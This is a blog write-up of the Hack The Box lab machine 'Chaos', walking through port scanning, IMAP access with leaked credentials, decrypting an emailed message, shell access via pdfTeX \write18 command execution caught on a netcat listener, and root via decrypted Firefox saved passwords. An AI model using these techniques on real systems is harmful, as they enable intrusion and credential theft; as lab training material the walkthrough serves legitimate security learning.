---
layout: post
title: Hackthebox Chaos Writeup
categories: HackTheBox
---

![placeholder](https://inar1.github.io/public/images/2019-06-08/chaos_badge.png)
## Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has bunch of vulnerable machines in its own VPN.
This is a write-up of machine "Chaos" on that website.

## Solution
### 1. Initial Enumeration
Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.120 -sV -sC
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-05 10:19 EEST
Nmap scan report for chaos (10.10.10.120)
Host is up (0.035s latency).
Not shown: 65529 closed ports
PORT      STATE SERVICE  VERSION
80/tcp    open  http     Apache httpd 2.4.34 ((Ubuntu))
|_http-server-header: Apache/2.4.34 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp   open  pop3     Dovecot pop3d
|_pop3-capabilities: RESP-CODES PIPELINING AUTH-RESP-CODE STLS SASL CAPA UIDL TOP
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
|_ssl-date: TLS randomness does not represent time
143/tcp   open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: ENABLE have more SASL-IR post-login LITERAL+ listed capabilities IDLE ID LOGIN-REFERRALS IMAP4rev1 Pre-login STARTTLS OK LOGINDISABLEDA0001
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
|_ssl-date: TLS randomness does not represent time
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: ENABLE have SASL-IR more LITERAL+ post-login listed IDLE ID AUTH=PLAINA0001 IMAP4rev1 capabilities Pre-login OK LOGIN-REFERRALS
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
|_ssl-date: TLS randomness does not represent time
995/tcp   open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: RESP-CODES PIPELINING USER AUTH-RESP-CODE SASL(PLAIN) CAPA UIDL TOP
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
|_ssl-date: TLS randomness does not represent time
10000/tcp open  http     MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.86 seconds
{% endhighlight %}

Gobuster HTTP:
{% highlight shell %}
root@kali:~# gobuster -u http://10.10.10.120/ -x php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.120/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php
[+] Timeout      : 10s
=====================================================
2019/06/05 10:23:29 Starting gobuster
=====================================================
/wp (Status: 301)
/javascript (Status: 301)
/server-status (Status: 403)
=====================================================
2019/06/05 10:50:39 Finished
=====================================================
{% endhighlight %}

### 2. Getting User
We found a ditrectory "wp" and it has wordpress website.
![placeholder](https://inar1.github.io/public/images/2019-06-08/2019-06-08-09-53-48.png)

It shows a password input box for protected area of this page.
![placeholder](https://inar1.github.io/public/images/2019-06-08/2019-06-08-09-54-29.png)

As we can see, this post is by user "human".<br>
So put "human" as a password,  we can pass the authentication and get following credential for webmail.
![placeholder](https://inar1.github.io/public/images/2019-06-08/2019-06-08-09-55-12.png)
{% highlight shell %}
ayush:jiujitsu
{% endhighlight %}

IMAP/IMAPS is running on this server and it's accessible for other hosts.<br>
We can use openssl as a ssl client to access to IMAPS..
{% highlight shell %}
root@kali:~# openssl s_client -connect 10.10.10.120:993

~~~

a login ayush jiujitsu
a OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in
{% endhighlight %}

By following command, we can enumerate the mail box.<br>
We have only one mail in the box "Drafts".
{% highlight shell %}
a list "" *
* LIST (\NoInferiors \UnMarked \Drafts) "/" Drafts
* LIST (\NoInferiors \UnMarked \Sent) "/" Sent
* LIST (\HasNoChildren) "/" INBOX
a OK List completed (0.003 + 0.000 + 0.002 secs).

a select Drafts
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 1 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1540728611] UIDs valid
* OK [UIDNEXT 5] Predicted next UID
a OK [READ-WRITE] Select completed (0.003 + 0.000 + 0.002 secs).

a select Sent
* OK [CLOSED] Previous mailbox closed.
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 0 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1540728610] UIDs valid
* OK [UIDNEXT 1] Predicted next UID
a OK [READ-WRITE] Select completed (0.002 + 0.000 + 0.001 secs).

a select INBOX
* OK [CLOSED] Previous mailbox closed.
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 0 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1540728609] UIDs valid
* OK [UIDNEXT 1] Predicted next UID
a OK [READ-WRITE] Select completed (0.001 + 0.000 + 0.001 secs).
{% endhighlight %}

After selected "Draft", we can read the mail and attached files by following command.
{% highlight shell %}
a fetch 1 body[]    
* 1 FETCH (BODY[] {2532}
MIME-Version: 1.0
Content-Type: multipart/mixed;
 boundary="=_00b34a28b9033c43ed09c0950f4176e1"
Date: Sun, 28 Oct 2018 17:46:38 +0530
From: ayush <ayush@localhost>
To: undisclosed-recipients:;
Subject: service
Message-ID: <7203426a8678788517ce8d28103461bd@webmail.chaos.htb>
X-Sender: ayush@localhost
User-Agent: Roundcube Webmail/1.3.8

--=_00b34a28b9033c43ed09c0950f4176e1
Content-Transfer-Encoding: 7bit
Content-Type: text/plain; charset=US-ASCII;
 format=flowed

Hii, sahay
Check the enmsg.txt
You are the password XD.
Also attached the script which i used to encrypt.
Thanks,
Ayush

--=_00b34a28b9033c43ed09c0950f4176e1
Content-Transfer-Encoding: base64
Content-Type: application/octet-stream;
 name=enim_msg.txt
Content-Disposition: attachment;
 filename=enim_msg.txt;
 size=272

MDAwMDAwMDAwMDAwMDIzNK7uqnoZitizcEs4hVpDg8z18LmJXjnkr2tXhw/AldQmd/g53L6pgva9
RdPkJ3GSW57onvseOe5ai95/M4APq+3mLp4GQ5YTuRTaGsHtrMs7rNgzwfiVor7zNryPn1Jgbn8M
7Y2mM6I+lH0zQb6Xt/JkhOZGWQzH4llEbyHvvlIjfu+MW5XrOI6QAeXGYTTinYSutsOhPilLnk1e
6Hq7AUnTxcMsqqLdqEL5+/px3ZVZccuPUvuSmXHGE023358ud9XKokbNQG3LOQuRFkpE/LS10yge
+l6ON4g1fpYizywI3+h9l5Iwpj/UVb0BcVgojtlyz5gIv12tAHf7kpZ6R08=
--=_00b34a28b9033c43ed09c0950f4176e1
Content-Transfer-Encoding: base64
Content-Type: text/x-python; charset=us-ascii;
 name=en.py
Content-Disposition: attachment;
 filename=en.py;
 size=804

ZGVmIGVuY3J5cHQoa2V5LCBmaWxlbmFtZSk6CiAgICBjaHVua3NpemUgPSA2NCoxMDI0CiAgICBv
dXRwdXRGaWxlID0gImVuIiArIGZpbGVuYW1lCiAgICBmaWxlc2l6ZSA9IHN0cihvcy5wYXRoLmdl
dHNpemUoZmlsZW5hbWUpKS56ZmlsbCgxNikKICAgIElWID1SYW5kb20ubmV3KCkucmVhZCgxNikK
CiAgICBlbmNyeXB0b3IgPSBBRVMubmV3KGtleSwgQUVTLk1PREVfQ0JDLCBJVikKCiAgICB3aXRo
IG9wZW4oZmlsZW5hbWUsICdyYicpIGFzIGluZmlsZToKICAgICAgICB3aXRoIG9wZW4ob3V0cHV0
RmlsZSwgJ3diJykgYXMgb3V0ZmlsZToKICAgICAgICAgICAgb3V0ZmlsZS53cml0ZShmaWxlc2l6
ZS5lbmNvZGUoJ3V0Zi04JykpCiAgICAgICAgICAgIG91dGZpbGUud3JpdGUoSVYpCgogICAgICAg
ICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICAgICAgY2h1bmsgPSBpbmZpbGUucmVhZChjaHVu
a3NpemUpCgogICAgICAgICAgICAgICAgaWYgbGVuKGNodW5rKSA9PSAwOgogICAgICAgICAgICAg
ICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBlbGlmIGxlbihjaHVuaykgJSAxNiAhPSAwOgog
ICAgICAgICAgICAgICAgICAgIGNodW5rICs9IGInICcgKiAoMTYgLSAobGVuKGNodW5rKSAlIDE2
KSkKCiAgICAgICAgICAgICAgICBvdXRmaWxlLndyaXRlKGVuY3J5cHRvci5lbmNyeXB0KGNodW5r
KSkKCmRlZiBnZXRLZXkocGFzc3dvcmQpOgogICAgICAgICAgICBoYXNoZXIgPSBTSEEyNTYubmV3
KHBhc3N3b3JkLmVuY29kZSgndXRmLTgnKSkKICAgICAgICAgICAgcmV0dXJuIGhhc2hlci5kaWdl
c3QoKQoK
--=_00b34a28b9033c43ed09c0950f4176e1--
)
a OK Fetch completed (0.002 + 0.000 + 0.001 secs).
{% endhighlight %}

It's just base64 encoded messages. Easy to decode en.py.<br>
However, enim_msg.txt is encrypted so we still need one step to get correct message.
{% highlight shell %}
root@kali:~# cat en.py 
ZGVmIGVuY3J5cHQoa2V5LCBmaWxlbmFtZSk6CiAgICBjaHVua3NpemUgPSA2NCoxMDI0CiAgICBv
dXRwdXRGaWxlID0gImVuIiArIGZpbGVuYW1lCiAgICBmaWxlc2l6ZSA9IHN0cihvcy5wYXRoLmdl
dHNpemUoZmlsZW5hbWUpKS56ZmlsbCgxNikKICAgIElWID1SYW5kb20ubmV3KCkucmVhZCgxNikK
CiAgICBlbmNyeXB0b3IgPSBBRVMubmV3KGtleSwgQUVTLk1PREVfQ0JDLCBJVikKCiAgICB3aXRo
IG9wZW4oZmlsZW5hbWUsICdyYicpIGFzIGluZmlsZToKICAgICAgICB3aXRoIG9wZW4ob3V0cHV0
RmlsZSwgJ3diJykgYXMgb3V0ZmlsZToKICAgICAgICAgICAgb3V0ZmlsZS53cml0ZShmaWxlc2l6
ZS5lbmNvZGUoJ3V0Zi04JykpCiAgICAgICAgICAgIG91dGZpbGUud3JpdGUoSVYpCgogICAgICAg
ICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICAgICAgY2h1bmsgPSBpbmZpbGUucmVhZChjaHVu
a3NpemUpCgogICAgICAgICAgICAgICAgaWYgbGVuKGNodW5rKSA9PSAwOgogICAgICAgICAgICAg
ICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBlbGlmIGxlbihjaHVuaykgJSAxNiAhPSAwOgog
ICAgICAgICAgICAgICAgICAgIGNodW5rICs9IGInICcgKiAoMTYgLSAobGVuKGNodW5rKSAlIDE2
KSkKCiAgICAgICAgICAgICAgICBvdXRmaWxlLndyaXRlKGVuY3J5cHRvci5lbmNyeXB0KGNodW5r
KSkKCmRlZiBnZXRLZXkocGFzc3dvcmQpOgogICAgICAgICAgICBoYXNoZXIgPSBTSEEyNTYubmV3
KHBhc3N3b3JkLmVuY29kZSgndXRmLTgnKSkKICAgICAgICAgICAgcmV0dXJuIGhhc2hlci5kaWdl
c3QoKQoK

root@kali:~# cat en.py | base64 -d
def encrypt(key, filename):
    chunksize = 64*1024
    outputFile = "en" + filename
    filesize = str(os.path.getsize(filename)).zfill(16)
    IV =Random.new().read(16)

    encryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(filename, 'rb') as infile:
        with open(outputFile, 'wb') as outfile:
            outfile.write(filesize.encode('utf-8'))
            outfile.write(IV)

            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - (len(chunk) % 16))

                outfile.write(encryptor.encrypt(chunk))

def getKey(password):
            hasher = SHA256.new(password.encode('utf-8'))
            return hasher.digest()

root@kali:~# cat enim_msg.txt 
MDAwMDAwMDAwMDAwMDIzNK7uqnoZitizcEs4hVpDg8z18LmJXjnkr2tXhw/AldQmd/g53L6pgva9
RdPkJ3GSW57onvseOe5ai95/M4APq+3mLp4GQ5YTuRTaGsHtrMs7rNgzwfiVor7zNryPn1Jgbn8M
7Y2mM6I+lH0zQb6Xt/JkhOZGWQzH4llEbyHvvlIjfu+MW5XrOI6QAeXGYTTinYSutsOhPilLnk1e
6Hq7AUnTxcMsqqLdqEL5+/px3ZVZccuPUvuSmXHGE023358ud9XKokbNQG3LOQuRFkpE/LS10yge
+l6ON4g1fpYizywI3+h9l5Iwpj/UVb0BcVgojtlyz5gIv12tAHf7kpZ6R08=

root@kali:~# cat enim_msg.txt | base64 -d
0000000000000234��z�سpK8�ZC����^9�kW����&w�9ܾ����E��'q�[���9�Z��3����.�C��������;��3������6���R`n
                퍦3�>�}3A����d��FY
                                  ��YDo!�R#~�[��8����a4❄��á>)K�M^�z�I���,��ݨB���qݕYqˏR���q�M�ߟ.w�ʢF�@m�9
                        �JD����(�^�7�5~�"���}��0�?�U�qX(��r�]�w���zGO
{% endhighlight %}

Sounds like this is a python script to encrypt given message.<br>
We can find this code in <a href="https://github.com/bing0o/Python-Scripts/blob/master/crypto.py">this</a> repository and we can find a code to decrypt the code as well.<br><br>

By following command, we can decrypt the encrypted message.
{% highlight shell %}
root@kali:~# cat enim_msg.txt 
MDAwMDAwMDAwMDAwMDIzNK7uqnoZitizcEs4hVpDg8z18LmJXjnkr2tXhw/AldQmd/g53L6pgva9RdPkJ3GSW57onvseOe5ai95/M4APq+3mLp4GQ5YTuRTaGsHtrMs7rNgzwfiVor7zNryPn1Jgbn8M7Y2mM6I+lH0zQb6Xt/JkhOZGWQzH4llEbyHvvlIjfu+MW5XrOI6QAeXGYTTinYSutsOhPilLnk1e6Hq7AUnTxcMsqqLdqEL5+/px3ZVZccuPUvuSmXHGE023358ud9XKokbNQG3LOQuRFkpE/LS10yge+l6ON4g1fpYizywI3+h9l5Iwpj/UVb0BcVgojtlyz5gIv12tAHf7kpZ6R08=

root@kali:~# cat enim_msg.txt | base64 -d > bin.hacklab

root@kali:~# python Python-Scripts/crypto.py -d bin.hacklab -p sahay


	
	               |
	               |
	          -----+------        -----------
	               |                                   
	               |
	    )                                           (
	    \ \                                       / /
	     \ |\                                   / |/
	      \|  \           hack1lab            /   /
	       \   |\         --------          / |  /
	        \  |  \_______________________/   | /
	         \ |    |      |      |      |    |/
	          \|    |      |      |      |    /
	           \____|______|______|______|___/



	              By: @hacklab, @mohamed1lar
	          fb.me/hack1lab, fb.me/mohamed1lar


[+] Decrypting......
[+] removing file......

[+] Done

root@kali:~# cat bin
SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK

root@kali:~# cat bin | base64 -d
Hii Sahay

Please check our new service which create pdf

p.s - As you told me to encrypt important msg, i did :)

http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3

Thanks,
Ayush
{% endhighlight %}

Sounds like we have something interesting in address "http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3"<br>
We have to add following line in "/etc/hosts" for name resolution.
{% highlight shell %}
10.10.10.120	chaos.htb
{% endhighlight %}

We have an interesting page to create a pdf file there.
![placeholder](https://inar1.github.io/public/images/2019-06-08/2019-06-08-09-56-06.png)

If we see the response, we can figure out this page is using pdfTex version 3.14159265-2.6-1.40.19
![placeholder](https://inar1.github.io/public/images/2019-06-08/2019-06-08-08-58-53.png)

At the same time, we can find a line "\write18 enabled".<br>
This means, we can execute shell command by having a payload and push the button "Create PDF".
![placeholder](https://inar1.github.io/public/images/2019-06-08/2019-06-08-09-11-41.png)
{% highlight shell %}
root@kali:~# nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.120] 49920
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
{% endhighlight %}

Then, get a full shell as ayush.
{% highlight shell %}
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$

www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ su - ayush
Password: jiujitsu

ayush@chaos:~$
{% endhighlight %}

However, we don't have appropriate value in $PATH.<br>
We have to modify the value.
{% highlight shell %}
ayush@chaos:~$ ls
ls
Command 'ls' is available in '/bin/ls'
The command could not be located because '/bin' is not included in the PATH environment variable.
ls: command not found

ayush@chaos:~$ echo $PATH
echo $PATH
/home/ayush/.app
{% endhighlight %}

By export command, we can put some additional value and it enables other shell command.<br>
"User.txt" is in the directory "/home/ayush".
{% highlight shell %}
ayush@chaos:~$ export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

ayush@chaos:~$ echo $PATH
/home/ayush/.app:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

ayush@chaos:~$ ls
mail  user.txt

ayush@chaos:~$ cat user.txt
eef39126d9c3b4b8a30286970dc713e1
{% endhighlight %}

### 3. Getting Root
In the home directory of ayush, we have ".mozilla" directory.
{% highlight shell %}
ayush@chaos:~$ ls -la
total 40
drwx------ 6 ayush ayush 4096 Jun  8 06:15 .
drwxr-xr-x 4 root  root  4096 Oct 28  2018 ..
drwxr-xr-x 2 root  root  4096 Oct 28  2018 .app
-rw------- 1 root  root     0 Nov 24  2018 .bash_history
-rw-r--r-- 1 ayush ayush  220 Oct 28  2018 .bash_logout
-rwxr-xr-x 1 root  root    22 Oct 28  2018 .bashrc
drwx------ 3 ayush ayush 4096 Jun  8 06:15 .gnupg
drwx------ 3 ayush ayush 4096 Oct 28  2018 mail
drwx------ 4 ayush ayush 4096 Sep 29  2018 .mozilla
-rw-r--r-- 1 ayush ayush  807 Oct 28  2018 .profile
-rw------- 1 ayush ayush   33 Oct 28  2018 user.txt
{% endhighlight %}

We can find a stored credentials for firefox in "logins.json" in following directory.
{% highlight shell %}
ayush@chaos:~/.mozilla/firefox/bzo7sjt1.default$ ls -l | grep "login"
ls -l | grep "login"
-rw------- 1 ayush ayush      570 Oct 27  2018 logins.json

ayush@chaos:~/.mozilla/firefox/bzo7sjt1.default$ cat logins.json
cat logins.json
{"nextId":3,"logins":[{"id":2,"hostname":"https://chaos.htb:10000","httpRealm":null,"formSubmitURL":"https://chaos.htb:10000","usernameField":"user","passwordField":"pass","encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECDSAazrlUMZFBAhbsMDAlL9iaw==","encryptedPassword":"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECNx7bW1TuuCuBBAP8YwnxCZH0+pLo6cJJxnb","guid":"{cb6cd202-0ff8-4de5-85df-e0b8a0f18778}","encType":1,"timeCreated":1540642202692,"timeLastUsed":1540642202692,"timePasswordChanged":1540642202692,"timesUsed":1}],"disabledHosts":[],"version":2}
{% endhighlight %}

We can decrypt the usename and password by <a href='https://github.com/unode/firefox_decrypt/blob/master/firefox_decrypt.py'>this</a> script.
{% highlight shell %}
ayush@chaos:~$ python firefox_decrypt.py
python firefox_decrypt.py

Master Password for profile /home/ayush/.mozilla/firefox/bzo7sjt1.default: jiujitsu


Website:   https://chaos.htb:10000
Username: 'root'
Password: 'Thiv8wrej~'
{% endhighlight %}

With above credential, we can login as a root user.
{% highlight shell %}
ayush@chaos:~$ su root
su root
Password: Thiv8wrej~

root@chaos:/home/ayush# cd
cd

root@chaos:~# cat root.txt
cat root.txt
4eca7e09e3520e020884563cfbabbc70
{% endhighlight %}
